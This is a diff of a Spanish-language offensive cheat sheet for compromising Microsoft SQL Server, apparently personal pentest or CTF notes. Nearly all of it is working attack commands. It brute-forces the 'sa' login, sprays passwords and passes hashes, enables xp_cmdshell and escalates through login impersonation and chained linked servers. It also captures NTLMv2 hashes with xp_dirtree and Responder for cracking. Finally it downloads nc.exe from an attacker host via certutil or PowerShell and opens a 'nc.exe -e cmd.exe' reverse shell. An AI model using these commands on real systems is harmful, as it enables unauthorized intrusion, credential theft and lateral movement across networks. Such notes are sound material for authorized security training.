@@ -1,22 +1,23 @@
 # Microsoft SQL Server (1433)
 
-Tags: #MSSQL #SQLServer #Windows #DC #RCE #HashCapture #NTLMRelay
+Tags: #MSSQL #SQLServer #Windows #DC #RCE #HashCapture #NTLMRelay #Impersonacion #LinkedServers
 
 ## OBJETIVO
 
-- Validar acceso a la base de datos con credenciales o autenticación Windows
-- Enumerar bases de datos y usuarios
-- Obtener ejecución de comandos vía xp_cmdshell
+- Validar acceso desde fuera y desde dentro del servidor
+- Enumerar usuarios, bases de datos y permisos
+- Obtener RCE vía xp_cmdshell
 - Capturar hash NTLMv2 para crackear offline
-- Obtener reverse shell desde el servidor SQL
+- Escalar dentro de MSSQL via impersonación y linked servers
 
 ## TIPS
 
-1. **Siempre probar autenticación Windows (-windows-auth) Y autenticación SQL → una puede funcionar cuando la otra no**
-2. **xp_cmdshell deshabilitado por defecto → enable_xp_cmdshell lo habilita si eres sysadmin**
+1. **Siempre probar autenticación Windows (-windows-auth) Y SQL → una puede funcionar cuando la otra no**
+2. **xp_cmdshell deshabilitado por defecto → solo sysadmin puede habilitarlo**
 3. **xp_dirtree apuntando a tu IP → captura hash NTLMv2 sin necesidad de RCE**
-4. **Si tienes SA o sysadmin → ejecución de comandos directa → reverse shell inmediata**
+4. **NT Authority\System puede conectarse al MSSQL local sin credenciales**
 5. **Responder ANTES de ejecutar xp_dirtree → si lo haces al revés no capturas nada**
+6. **Impersonación → si puedes actuar como SA → xp_cmdshell aunque no seas sysadmin**
 
 ## TOOLS
 
@@ -28,225 +29,387 @@ Tags: #MSSQL #SQLServer #Windows #DC #RCE #HashCapture #NTLMRelay
 
 ---
 
-## 1. VALIDACIÓN DE ACCESO (ANTES DE CONECTAR)
+# DESDE FUERA DEL SERVIDOR (ACCESO REMOTO)
+
+## 1. VERIFICAR SI MSSQL ESTÁ EXPUESTO Y ENUMERAR
 
 ```bash
-❯ nxc mssql <IP> -u 'user' -p 'pass' --local-auth
+❯ nmap -p 1433 --open <IP❯
+# Confirmar que el puerto está abierto y escuchando
+
+❯ nmap <IP❯ -p 1433 --script ms-sql-info
+# Versión del servidor, nombre de instancia, hostname
+
+❯ nmap <IP❯ -p 1433 --script ms-sql-empty-password
+# Detectar usuarios sin contraseña → incluye sa y otros
+
+❯ nmap <IP❯ -p 1433 --script ms-sql-ntlm-info \
+  --script-args mssql.instance-port=1433
+# Información adicional vía NTLM → dominio, hostname, FQDN
+```
+
+---
+
+## 2. PROBAR ACCESO CON USUARIO SA (POR DEFECTO)
+
+```bash
+# sa → System Administrator → usuario por defecto de MSSQL
+# Frecuentemente habilitado con contraseña débil o vacía
+
+❯ nxc mssql <IP❯ -u 'sa' -p ''
+# Sin contraseña → el más común en instalaciones mal configuradas
+
+❯ nxc mssql <IP❯ -u 'sa' -p 'sa'
+❯ nxc mssql <IP❯ -u 'sa' -p 'admin'
+❯ nxc mssql <IP❯ -u 'sa' -p 'Password1'
+❯ nxc mssql <IP❯ -u 'sa' -p 'password'
+# Contraseñas comunes para sa → probar siempre antes de fuerza bruta
+
+❯ nxc mssql <IP❯ -u 'sa' -p /usr/share/seclists/Passwords/Common-Credentials/best110.txt
+# Fuerza bruta al sa con wordlist corta → más rápido
+
+# [Pwn3d!] → sa está habilitado y eres sysadmin → xp_cmdshell disponible
+```
+
+---
+
+## 3. VALIDACIÓN DE ACCESO CON CREDENCIALES CONOCIDAS
+
+```bash
+❯ nxc mssql <IP❯ -u 'user' -p 'pass' --local-auth
 # Autenticación SQL local → no requiere dominio
-# [Pwn3d!] → eres sysadmin → xp_cmdshell disponible
 
-❯ nxc mssql <IP> -u 'user' -p 'pass' -d domain.corp
-# Autenticación Windows con dominio → más común en entornos AD
+❯ nxc mssql <IP❯ -u 'user' -p 'pass' -d domain.corp
+# Autenticación Windows con dominio → más común en AD
 
-❯ nxc mssql <IP> -u 'user' -H 'NThash' -d domain.corp
-# Pass-the-Hash → autenticación Windows sin contraseña en claro
+❯ nxc mssql <IP❯ -u 'user' -H 'NThash' -d domain.corp
+# Pass-the-Hash → sin contraseña en claro
 
-❯ nxc mssql <IP> -u users.txt -p passwords.txt --continue-on-success --local-auth
-# Fuerza bruta con autenticación SQL local
-# Cuidado con lockout policy
+❯ nxc mssql <IP❯ -u users.txt -p passwords.txt --continue-on-success
+# Spraying de credenciales
 
-❯ nxc mssql <IP> -u users.txt -p 'Password123' -d domain.corp
-# Password spraying con autenticación Windows
-```
-
-### Insight
-
-- [Pwn3d!] → eres sysadmin → ir directo a habilitar xp_cmdshell
-- Sin [Pwn3d!] pero con acceso → enumerar DBs y capturar hash NTLMv2
-
----
-
-## 2. CONEXIÓN A LA BASE DE DATOS
-
-```bash
-❯ impacket-mssqlclient domain.corp/'user:passwd'@<IP> -windows-auth
-# Requiere creds válidas → autenticación Windows (más común en AD)
-# -windows-auth → usa credenciales de dominio, no SQL
-
-❯ impacket-mssqlclient domain.corp/'user:passwd'@<IP> -windows-auth -port 1433
-# Especificar puerto → útil si MSSQL corre en puerto no estándar
-
-❯ impacket-mssqlclient 'user:passwd'@<IP>
-# Sin -windows-auth → autenticación SQL local
-# Útil cuando no hay dominio o SA tiene contraseña
-
-❯ sqsh -S <IP> -U 'user' -P 'passwd'
-# Alternativa a mssqlclient → cliente SQL interactivo
-# Útil cuando impacket falla o no está disponible
-# Los comandos terminan con 'go' para ejecutarse
+# Insight:
+# [Pwn3d!] → sysadmin → xp_cmdshell directo
+# Sin [Pwn3d!] pero con acceso → enumerar y buscar impersonación
 ```
 
 ---
 
-## 3. ENUMERACIÓN DENTRO DE LA DB
+## 4. CONEXIÓN Y AUTENTICACIÓN
 
 ```bash
-# Dentro de impacket-mssqlclient:
+# Autenticación Windows (dominio) → más común en AD
+❯ impacket-mssqlclient domain.corp/'user:passwd'@<IP❯ -windows-auth
+
+# Autenticación SQL local → sa u otros usuarios SQL
+❯ impacket-mssqlclient 'sa:passwd'@<IP❯
+
+# Puerto no estándar
+❯ impacket-mssqlclient domain.corp/'user:passwd'@<IP❯ -windows-auth -port 1433
+
+# sqsh → alternativa cuando impacket falla
+❯ sqsh -S <IP❯ -U 'user' -P 'passwd'
+# Los comandos en sqsh terminan con 'go' para ejecutarse
+```
+
+---
+
+## 5. ENUMERACIÓN DENTRO DEL MSSQL (DESDE FUERA)
+
+```bash
+# Dentro de impacket-mssqlclient
 
 ❯ help
-# Ver todos los comandos disponibles
+# Ver todos los comandos disponibles de impacket
 
 ❯ enum_db
-# No requiere privilegios especiales → lista todas las bases de datos
+# Listar todas las bases de datos
 
 ❯ enum_users
-# Lista usuarios de la base de datos actual
+# Usuarios de la base de datos actual
+
+# Queries SQL directas
 
 ❯ SELECT name FROM master.dbo.sysdatabases
-# Query SQL directo → listar todas las DBs
-
-❯ SELECT name, is_disabled FROM sys.server_principals WHERE type = 'S'
-# Listar logins SQL y si están deshabilitados
+# Todas las bases de datos
 
 ❯ SELECT IS_SRVROLEMEMBER('sysadmin')
-# Verificar si el usuario actual es sysadmin
-# 1 → sysadmin | 0 → no lo es
+# 1 → soy sysadmin | 0 → no lo soy
+# Determina si puedo habilitar xp_cmdshell
+
+❯ SELECT name, type_desc, is_disabled FROM sys.server_principals
+# Todos los logins → usuarios locales, de dominio, sa
+
+❯ SELECT name, is_disabled FROM sys.server_principals WHERE type = 'S'
+# Solo logins SQL (no Windows)
 
 ❯ xp_dirtree C:\Users\
-# Enumerar directorios → no requiere xp_cmdshell
-# Útil para explorar el sistema de archivos sin RCE
+# Explorar sistema de archivos sin necesitar xp_cmdshell
 
 ❯ xp_dirtree C:\inetpub\wwwroot\
-# Ruta raíz del servidor IIS → buscar webshells o configs
+# Raíz IIS → buscar configs con credenciales
 ```
 
 ---
 
-## 4. EJECUCIÓN DE COMANDOS (xp_cmdshell)
+## 6. VERIFICAR Y USAR IMPERSONACIÓN (ESCALAR EN MSSQL)
 
 ```bash
-# Dentro de impacket-mssqlclient:
-# Requiere ser sysadmin para habilitar xp_cmdshell
+# Impersonación → actuar como otro usuario con más privilegios
+# Muy común en entornos mal configurados → jon.snow puede ser samwel.tarlly → SA
 
+# Verificar si puedo impersonar a alguien
+❯ SELECT distinct b.name
+  FROM sys.server_permissions a
+  INNER JOIN sys.server_principals b
+  ON a.grantor_principal_id = b.principal_id
+  WHERE a.permission_name = 'IMPERSONATE'
+# Si devuelve usuarios → puedo impersonarlos
+
+❯ SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE'
+# Ver todos los permisos de impersonación disponibles
+
+# Impersonar el usuario encontrado
+❯ EXECUTE AS LOGIN = 'samwel.tarlly'
+❯ SELECT SYSTEM_USER
+# Confirmar que ahora soy samwel.tarlly
+
+❯ SELECT IS_SRVROLEMEMBER('sysadmin')
+# 1 → el usuario impersonado es SA → puedo usar xp_cmdshell
+
+# Habilitar y usar xp_cmdshell como el usuario impersonado
 ❯ enable_xp_cmdshell
-# Habilita xp_cmdshell → solo funciona si eres sysadmin
-# En impacket-mssqlclient este comando lo hace automáticamente
-
 ❯ xp_cmdshell "whoami"
-# Verifica con qué usuario corre el servicio SQL
-# Frecuentemente corre como NT Service\MSSQL o SYSTEM
 
-❯ xp_cmdshell "dir C:\\"
-# Listar contenido del disco
-
-❯ xp_cmdshell "net user"
-# Usuarios locales del sistema
-
-❯ xp_cmdshell "net localgroup administrators"
-# Verificar si el usuario SQL está en admins locales
+# Volver al usuario original
+❯ REVERT
 ```
-
-```bash
-# Dentro de sqsh:
-# Los comandos SQL terminan con 'go'
-
-❯ EXEC xp_cmdshell 'whoami'
-❯ go
-
-❯ EXEC xp_cmdshell 'dir C:\\'
-❯ go
-```
-
-### Insight
-
-- Si xp_cmdshell corre como SYSTEM → tienes control total del host
-- Si corre como servicio → buscar PrivEsc para llegar a SYSTEM
 
 ---
 
-## 5. OBTENER REVERSE SHELL
+## 7. LINKED SERVERS — PIVOTAR A OTRO SERVIDOR SQL
 
 ```bash
-# Dentro de impacket-mssqlclient o sqsh:
-# Primero subir netcat al servidor
+# Linked servers → este servidor tiene conexión a otro servidor MSSQL
+# Permite ejecutar queries en el servidor remoto
 
-❯ EXEC xp_cmdshell 'certutil -urlcache -split -f http://<IP_KALI>/nc.exe C:\temp\nc.exe'
-# Descargar nc.exe desde tu servidor HTTP → requiere xp_cmdshell activo
-# Antes: python3 -m http.server 80 en Kali con nc.exe en el directorio
+# Ver linked servers disponibles
+❯ SELECT * FROM sys.servers
+❯ SELECT * FROM sys.linked_logins
+# Ver con qué usuario se conecta al servidor remoto
 
-❯ EXEC xp_cmdshell 'C:\temp\nc.exe -e cmd.exe <IP_KALI> 443'
-# Ejecutar reverse shell hacia Kali
-# Antes: nc -lvnp 443 en Kali para recibir la conexión
+# Ejecutar comando en el linked server
+❯ EXEC('xp_cmdshell ''whoami''') AT braavos
+# 'braavos' → nombre del linked server
 
-# go (si usas sqsh después de cada comando)
+❯ EXEC('SELECT @@version') AT braavos
+# Verificar conectividad con el linked server
+
+❯ EXEC('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT braavos
+# Ver si el usuario tiene SA en el servidor remoto
+
+# Si tienes SA en el linked server → xp_cmdshell remoto
+❯ EXEC('EXEC xp_cmdshell ''whoami''') AT braavos
+# RCE en el servidor remoto sin comprometerlo directamente
+
+# Cadena de linked servers → linked server de linked server
+❯ EXEC('EXEC(''xp_cmdshell ''''whoami'''''') AT braavos') AT castelblack
+# Ejecutar en un tercer servidor a través de dos saltos
 ```
-
-### Insight
-
-- Crear C:\temp\ antes si no existe: `xp_cmdshell "mkdir C:\temp"`
-- Puerto 443 → más probable que pase por firewall que otros puertos
-- Alternativa a certutil: `powershell -c "IEX(New-Object Net.WebClient).DownloadFile('http://IP/nc.exe','C:\temp\nc.exe')"`
 
 ---
 
-## 6. CAPTURA DE HASH NTLMv2 (SIN RCE)
+## 8. CAPTURA DE HASH NTLMv2 (SIN RCE)
 
 ### Con Responder
 
 ```bash
-# PASO 1 — Iniciar Responder PRIMERO en Kali
+# PASO 1 → Responder PRIMERO en Kali
 ❯ responder -I tun0
-# Poner en escucha antes de ejecutar xp_dirtree
-# -v → ver el hash capturado anteriormente también
 
-# PASO 2 — Dentro de mssqlclient, apuntar a tu IP
-❯ xp_dirtree \\<IP_KALI>\aa
-# Intenta acceder a un share que no existe en tu Kali
-# Windows autentica automáticamente → captura el hash NTLMv2
+# PASO 2 → Dentro de mssqlclient
+❯ xp_dirtree \\<IP_KALI❯\aa
+# Autentica automáticamente → captura el hash NTLMv2
 
-# PASO 3 — Crackear el hash capturado
+# PASO 3 → Crackear
 ❯ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
-# Modo 5600 → NTLMv2
 ```
 
 ### Con impacket-smbserver
 
 ```bash
-# PASO 1 — Montar servidor SMB en Kali
 ❯ impacket-smbserver smbFolder $(pwd) -smb2support
-# Levanta servidor SMB en el directorio actual
-# Captura la autenticación cuando MSSQL intente conectarse
+# En Kali → levantar servidor SMB
 
-# PASO 2 — Dentro de mssqlclient
-❯ xp_dirtree \\<IP_KALI>\smbFolder\test
-# Apuntar al share que creaste → captura el hash
+❯ xp_dirtree \\<IP_KALI❯\smbFolder\test
+# Dentro de mssqlclient → captura el hash
 
-# PASO 3 — Crackear el hash
 ❯ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
 ### Con sqsh
 
 ```bash
-# PASO 1 — Iniciar Responder PRIMERO
 ❯ responder -I tun0
-
-# PASO 2 — Conectar con sqsh y ejecutar
-❯ sqsh -S <IP> -U 'user' -P 'passwd'
-❯ xp_dirtree '\\<IP_KALI>\aa'
+❯ sqsh -S <IP❯ -U 'user' -P 'passwd'
+❯ xp_dirtree '\\<IP_KALI❯\aa'
 ❯ go
-# go → ejecuta el comando en sqsh
 ```
 
-### Insight
+---
 
-- Hash NTLMv2 capturado → crackear con hashcat -m 5600 + rockyou
-- Si crackeas → tienes contraseña en claro → probar en SMB / WinRM / RDP
-- Si no crackeas → intentar relay con ntlmrelayx (ver nota de lateral movement)
+## 9. OBTENER REVERSE SHELL (DESDE FUERA)
+
+```bash
+# Requiere xp_cmdshell habilitado → ser sysadmin o impersonar SA
+
+# Paso 1 → Crear directorio temporal si no existe
+❯ xp_cmdshell "mkdir C:\temp"
+
+# Paso 2 → Descargar nc.exe desde Kali
+❯ EXEC xp_cmdshell 'certutil -urlcache -split -f http://<IP_KALI❯/nc.exe C:\temp\nc.exe'
+# Antes: python3 -m http.server 80 en Kali
+
+# Alternativa a certutil
+❯ xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadFile(\"http://<IP_KALI❯/nc.exe\",\"C:\temp\nc.exe\")"'
+
+# Paso 3 → Ejecutar reverse shell
+❯ EXEC xp_cmdshell 'C:\temp\nc.exe -e cmd.exe <IP_KALI❯ 443'
+# Antes: rlwrap nc -nlvp 443 en Kali
+
+# En sqsh → añadir 'go' después de cada comando
+```
+
+---
+
+# DESDE DENTRO DEL SERVIDOR (ACCESO LOCAL)
+
+## 10. CONECTARSE AL MSSQL LOCAL SIN CREDENCIALES
+
+```bash
+# NT Authority\System puede conectarse al MSSQL local sin contraseña
+# Porque SYSTEM es el dueño del servicio → autenticación implícita
+
+# Verificar si MSSQL está corriendo localmente
+❯ netstat -ano | findstr 1433
+❯ ss -tlnp | grep 1433
+❯ Get-Service | Where-Object {$_.Name -like "*sql*"}
+❯ sc query MSSQLSERVER
+❯ sc query "MSSQL$INSTANCE"    # Si tiene nombre de instancia
+```
+
+### Desde CMD como SYSTEM o Admin local
+
+```bash
+# Conexión con sqlcmd → herramienta nativa de SQL Server
+❯ sqlcmd -S localhost -Q "SELECT SYSTEM_USER"
+# Sin credenciales → usa autenticación Windows del usuario actual
+# Si eres SYSTEM → autenticas como SA implícitamente
+
+❯ sqlcmd -S localhost -Q "SELECT IS_SRVROLEMEMBER('sysadmin')"
+# 1 → soy sysadmin desde SYSTEM
+
+❯ sqlcmd -S localhost -Q "EXEC xp_cmdshell 'whoami'"
+# RCE desde SYSTEM → sin credenciales externas
+
+# Con nombre de instancia
+❯ sqlcmd -S localhost\SQLEXPRESS -Q "SELECT SYSTEM_USER"
+❯ sqlcmd -S .\SQLEXPRESS -Q "SELECT SYSTEM_USER"
+
+# Listar instancias disponibles
+❯ sqlcmd -L
+```
+
+### Desde PowerShell como SYSTEM o Admin local
+
+```powershell
+# Sin credenciales → autenticación Windows implícita
+❯ Invoke-Sqlcmd -Query "SELECT SYSTEM_USER" -ServerInstance localhost
+❯ Invoke-Sqlcmd -Query "SELECT IS_SRVROLEMEMBER('sysadmin')" -ServerInstance localhost
+❯ Invoke-Sqlcmd -Query "EXEC xp_cmdshell 'whoami'" -ServerInstance localhost
+
+# Si el módulo no está disponible → cargar manualmente
+❯ Import-Module SqlServer
+❯ Invoke-Sqlcmd -Query "SELECT SYSTEM_USER" -ServerInstance "localhost"
+
+# Alternativa con .NET directamente
+❯ $conn = New-Object System.Data.SqlClient.SqlConnection
+❯ $conn.ConnectionString = "Server=localhost;Integrated Security=True"
+❯ $conn.Open()
+❯ $cmd = $conn.CreateCommand()
+❯ $cmd.CommandText = "SELECT SYSTEM_USER"
+❯ $cmd.ExecuteScalar()
+```
+
+---
+
+## 11. VERIFICAR EL USUARIO DEL SERVICIO SQL (DESDE DENTRO)
+
+```bash
+# Saber con qué usuario corre el servicio MSSQL
+# Importante porque ese usuario puede tener SeImpersonatePrivilege
+
+❯ sc qc MSSQLSERVER
+# Ver "SERVICE_START_NAME" → usuario del servicio
+
+❯ Get-WmiObject Win32_Service | Where-Object {$_.Name -like "*sql*"} | Select Name,StartName
+# PowerShell → usuario del servicio SQL
+
+❯ tasklist /v | findstr /i "sql"
+# Ver procesos SQL y el usuario que los ejecuta
+
+# Usuarios típicos del servicio MSSQL:
+# NT Service\MSSQLSERVER   → tiene SeImpersonatePrivilege → Potato attack
+# NT Authority\System      → SYSTEM → acceso total
+# NT Authority\Network Service → tiene SeImpersonatePrivilege
+# DOMAIN\ServiceAccount    → cuenta de dominio → credenciales valiosas
+```
+
+---
+
+## 12. ENUMERAR DESDE DENTRO CON SQLCMD
+
+```bash
+# Enumeración completa desde shell local como SYSTEM o admin
+
+❯ sqlcmd -S localhost -Q "SELECT name FROM master.dbo.sysdatabases"
+# Todas las bases de datos
+
+❯ sqlcmd -S localhost -Q "SELECT name, type_desc FROM sys.server_principals WHERE type IN ('U','G','S')"
+# Todos los logins → usuarios Windows, grupos y SQL
+
+❯ sqlcmd -S localhost -Q "SELECT * FROM sys.server_permissions WHERE permission_name='IMPERSONATE'"
+# Ver impersonación disponible desde dentro
+
+❯ sqlcmd -S localhost -Q "SELECT * FROM sys.servers"
+# Linked servers → otros SQL servers enlazados
+
+❯ sqlcmd -S localhost -Q "SELECT name FROM sys.databases"
+# Bases de datos disponibles
+
+❯ sqlcmd -S localhost -Q "USE <database❯; SELECT * FROM information_schema.tables"
+# Tablas de una base de datos específica
+```
 
 ---
 
 ## CONDICIONES CLAVE
 
-- [Pwn3d!] en nxc → sysadmin → habilitar xp_cmdshell → RCE directo
-- Sin [Pwn3d!] pero con acceso → capturar hash NTLMv2 con xp_dirtree
-- Hash capturado → crackear con hashcat -m 5600
-- xp_cmdshell activo → subir nc.exe → reverse shell
+```
+¿Tengo sa o sysadmin?          → enable_xp_cmdshell → RCE directo
+¿Sin sysadmin pero con acceso? → verificar impersonación → actuar como SA
+¿Puedo impersonar SA?          → EXECUTE AS LOGIN → sysadmin → RCE
+¿Hay linked servers?           → EXEC('xp_cmdshell...') AT server → RCE remoto
+¿Soy SYSTEM local?             → sqlcmd sin creds → SA implícito → RCE
+¿El servicio SQL usa SeImpersonate? → Potato attack → SYSTEM del host
+```
 
 ## ONE-LINERS MENTALES
 
-- Puerto 1433 abierto → validar con nxc mssql antes de conectar
+- Puerto 1433 abierto → probar sa sin contraseña primero
 - [Pwn3d!] → enable_xp_cmdshell → xp_cmdshell "whoami"
-- Sin sysadmin → Responder primero → xp_dirtree a tu IP → hash NTLMv2
-- Hash crackeado → probar en SMB / WinRM / RDP inmediatamente
-- RCE disponible → certutil para bajar nc.exe → reverse shell al 443
+- Sin sysadmin → verificar impersonación → EXECUTE AS LOGIN → escalar
+- Linked server disponible → EXEC('xp_cmdshell...') AT server → RCE en otro host
+- SYSTEM local → sqlcmd -S localhost sin creds → SA implícito
+- Servicio SQL como NT Service\MSSQL → SeImpersonatePrivilege → Potato
+- Sin RCE → Responder primero → xp_dirtree a tu IP → NTLMv2 → crackear
